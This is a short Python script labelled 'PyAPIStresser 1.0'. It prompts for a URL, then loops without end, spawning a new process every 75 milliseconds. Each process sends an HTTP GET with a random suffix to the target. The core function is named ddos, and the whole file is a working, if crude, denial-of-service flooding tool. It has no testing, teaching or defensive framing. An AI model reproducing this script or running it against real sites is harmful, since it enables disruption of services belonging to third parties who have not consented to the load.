#!/bin/env python
import random
import os
import time
import requests
from multiprocessing import Process
print("PyAPIStresser 1.0")
url=str(input("Enter URL"))
i=0
def ddos():
    randcode=str(random.randint(123456,1000000000))
    _tmp = requests.get(url+randcode)
    print("a req sent")
while True:
    t = Process(target=ddos)
    t.start()
    time.sleep(0.075)
    i+=1
    print("created " + str(i) + " process")
